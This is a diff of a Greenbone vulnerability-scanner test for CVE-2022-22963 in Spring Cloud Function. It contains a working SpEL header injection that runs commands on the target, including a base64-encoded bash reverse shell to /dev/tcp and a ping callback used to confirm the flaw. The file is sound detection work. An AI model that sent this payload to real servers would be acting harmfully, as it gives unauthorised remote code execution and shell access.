@@ -1,28 +1,14 @@
-# Copyright (C) 2022 Greenbone Networks GmbH
+# SPDX-FileCopyrightText: 2022 Greenbone AG
 # Some text descriptions might be excerpted from (a) referenced
 # source(s), and are Copyright (C) by the respective right holder(s).
 #
-# SPDX-License-Identifier: GPL-2.0-or-later
-#
-# This program is free software; you can redistribute it and/or
-# modify it under the terms of the GNU General Public License
-# as published by the Free Software Foundation; either version 2
-# of the License, or (at your option) any later version.
-#
-# This program is distributed in the hope that it will be useful,
-# but WITHOUT ANY WARRANTY; without even the implied warranty of
-# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
-# GNU General Public License for more details.
-#
-# You should have received a copy of the GNU General Public License
-# along with this program; if not, write to the Free Software
-# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
+# SPDX-License-Identifier: GPL-2.0-only
 
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.148068");
-  script_version("2023-02-13T10:19:38+0000");
-  script_tag(name:"last_modification", value:"2023-02-13 10:19:38 +0000 (Mon, 13 Feb 2023)");
+  script_version("2024-11-14T05:05:31+0000");
+  script_tag(name:"last_modification", value:"2024-11-14 05:05:31 +0000 (Thu, 14 Nov 2024)");
   script_tag(name:"creation_date", value:"2022-05-06 07:53:32 +0000 (Fri, 06 May 2022)");
   script_tag(name:"cvss_base", value:"7.5");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
@@ -30,8 +16,6 @@ if(description)
   script_tag(name:"severity_origin", value:"NVD");
   script_tag(name:"severity_date", value:"2022-04-06 13:16:00 +0000 (Wed, 06 Apr 2022)");
 
-  script_xref(name:"CISA", value:"Known Exploited Vulnerability (KEV) catalog");
-  script_xref(name:"URL", value:"https://www.cisa.gov/known-exploited-vulnerabilities-catalog");
   script_cve_id("CVE-2022-22963");
 
   script_tag(name:"qod_type", value:"exploit");
@@ -42,17 +26,18 @@ if(description)
 
   script_category(ACT_ATTACK);
 
-  script_copyright("Copyright (C) 2022 Greenbone Networks GmbH");
+  script_copyright("Copyright (C) 2022 Greenbone AG");
   script_family("Web application abuses");
-  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl",
-                      "os_detection.nasl", "global_settings.nasl");
+  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl",
+                      "DDI_Directory_Scanner.nasl", "os_detection.nasl", "global_settings.nasl");
   script_require_ports("Services/www", 8080);
   script_exclude_keys("Settings/disable_cgi_scanning");
 
   script_tag(name:"summary", value:"VMware Spring Cloud Function is prone to a remote code
   execution (RCE) vulnerability.");
 
-  script_tag(name:"vuldetect", value:"Sends a crafted HTTP POST requests and checks the response.
+  script_tag(name:"vuldetect", value:"Sends a crafted HTTP POST request and checks if the target is
+  connecting back to the scanner host.
 
   Notes:
 
@@ -78,6 +63,8 @@ if(description)
   script_xref(name:"URL", value:"https://tanzu.vmware.com/security/cve-2022-22963");
   script_xref(name:"URL", value:"https://spring.io/blog/2022/03/29/cve-report-published-for-spring-cloud-function");
   script_xref(name:"URL", value:"https://nakedsecurity.sophos.com/2022/03/30/vmware-spring-cloud-java-bug-gives-instant-remote-code-execution-update-now/");
+  script_xref(name:"URL", value:"https://www.cisa.gov/known-exploited-vulnerabilities-catalog");
+  script_xref(name:"CISA", value:"Known Exploited Vulnerability (KEV) catalog");
 
   # With two payloads for each folder and 10 seconds timeout in total for both requests we might
   # reach the default script_timeout on larger web pages quite easily so this was raised a little.
@@ -93,6 +80,7 @@ include("misc_func.inc");
 include("pcap_func.inc");
 include("port_service_func.inc");
 include("os_func.inc");
+include("dump.inc");
 
 ownip = this_host();
 targetip = get_host_ip();
@@ -137,56 +125,103 @@ if (!throughout_tests_disabled) {
 
 ownhostname = this_host_name();
 ownip = this_host();
-targetip = get_host_ip();
-
-# nb: We're currently using 10000-32000 to not get in conflict with the ephemeral port range used by
-# most standard Linux/Unix operating systems. If we're choosing a port of that range we might have
-# false positives due to race conditions (target is sending back a response to a request of another
-# VT for which the scanner had chosen the same source port).
-# This is also done outside of the forach loop as we don't want to have used a separate random port
-# for every single request and for each dir. This is done like this because we might exceed the
-# random port list on large web apps quite easily which could cause false positives or similar if
-# the same random port is used by another VT.
-rnd_port = rand_int_range(min: 10000, max: 32000);
+src_filter = pcap_src_ip_filter_from_hostnames();
 dst_filter = string("(dst host ", ownip, " or dst host ", ownhostname, ")");
 
 vt_strings = get_vt_strings();
-data = vt_strings["default"];
-request_type = "a TCP";
-filter = string("tcp and dst port ", rnd_port, " and src host ", targetip, " and ", dst_filter);
+body = vt_strings["default"];
 
 if (os_host_runs("Windows") == "yes") {
-  is_windows = TRUE;
+
+  target_runs_windows = TRUE;
   ping_used = TRUE;
   request_type = "an ICMP";
-  filter = string("icmp and icmp[0] = 8 and src host ", targetip, " and ", dst_filter);
+
+  filter = string("icmp and icmp[0] = 8 and ", src_filter, " and ", dst_filter);
+}
+
+else {
+
+  request_type = "a TCP";
+
+  # nb:
+  # - We're currently using 10000-32000 to not get in conflict with the ephemeral port range used
+  #   by most standard Linux/Unix operating systems. If we're choosing a port of that range we might
+  #   have false positives due to race conditions (target is sending back a response to a request of
+  #   another VT for which the scanner had chosen the same source port).
+  # - This is also done outside of the foreach loop as we don't want to use a separate random port
+  #   for every single request and for each dir. This is done like this because we might exceed the
+  #   random port list on large web apps quite easily which could cause false positives or similar
+  #   if the same random port is used by another VT.
+  rnd_port = rand_int_range(min: 10000, max: 32000);
+
+  filter = string("tcp and dst port ", rnd_port, " and ", src_filter, " and ", dst_filter);
+  # nb: We're only interested in TCP SYN packets and want to ignore all others (e.g. ACK, RST, ...)
+  filter = string(filter, " and tcp[tcpflags] & (tcp-syn) != 0");
 }
 
 foreach connect_back_target (make_list(ownip, ownhostname)) {
 
-  if (is_windows) {
+  if (target_runs_windows) {
     payload = "ping -n 5 " + connect_back_target;
     headers = make_array("spring.cloud.function.routing-expression", 'T(java.lang.Runtime).getRuntime().exec("' + payload + '")');
-  } else {
+  }
+
+  else {
     payload = "bash -i >&/dev/tcp/" + connect_back_target + "/" + rnd_port + " 0>&1";
     base64_payload = base64(str: payload);
     headers = make_array("spring.cloud.function.routing-expression", 'T(java.lang.Runtime).getRuntime().exec("bash -c {echo,' + base64_payload + '}|{base64,-d}|{bash,-i}")');
   }
 
   foreach url (check_list) {
+
+    req = http_post_put_req(port: port, url: url, data: body, add_headers: headers);
+
+    # nb: Always keep open_sock_tcp() after the first call of a function forking on multiple
+    # hostnames / vhosts (e.g. http_get(), http_post_put_req(), http_host_name(), get_host_name(),
+    # ...). Reason: If the fork would be done after calling open_sock_tcp() the child's would share
+    # the same socket causing race conditions and similar.
     if (!soc = open_sock_tcp(port))
       continue;
 
-    req = http_post_put_req(port: port, url: url, data: data, add_headers: headers);
     res = send_capture(socket: soc, data: req, timeout: 5, pcap_filter: filter);
 
     close(soc);
 
-    if (res) {
+    if (!res)
+      continue;
+
+    VULN = FALSE;
+
+    if (ping_used) {
+
+     type = get_icmp_element(icmp: res, element: "icmp_type");
+     if (!type || type != 8)
+        continue;
+
+     # nb: If understanding https://datatracker.ietf.org/doc/html/rfc792 correctly the "data" field
+     # should be always there. In addition at least standard Linux and Windows systems are always
+     # sending data so it should be safe to check this here.
+     if (!data = get_icmp_element(icmp: res, element: "data"))
+       continue;
+
+      VULN = TRUE;
+    }
+
+    else {
+
+      # nb: See note above on the reason of this check. This is just another fallback if something is
+      # going wrong in the send_capture() call above.
+      flags = get_tcp_element(tcp: res, element: "th_flags");
+      if (flags & TH_SYN)
+        VULN = TRUE;
+    }
+
+    if (VULN) {
       info["HTTP Method"] = "POST";
       info["Affected URL"] = http_report_vuln_url(port: port, url: url, url_only: TRUE);
       info['HTTP "spring.cloud.function.routing-expression" header'] = headers["spring.cloud.function.routing-expression"];
-      info['HTTP "POST" body'] = data;
+      info['HTTP "POST" body'] = body;
 
       # nb: We need to call the correct get_ip_*element() function below depending on the IP version
       # of the received IP packet.
@@ -212,6 +247,8 @@ foreach connect_back_target (make_list(ownip, ownhostname)) {
       if (!ping_used)
         report += "Destination port: " + rnd_port + '/tcp (receiving port on scanner host side)\n';
       report += "Originating IP:   " + src_ip + " (originating IP from target host side)";
+      if (ping_used)
+        report += '\n\nReceived answer (ICMP "Data" field):\n\n' + hexdump(ddata: data);
       security_message(port: port, data: report);
       exit(0);
     }
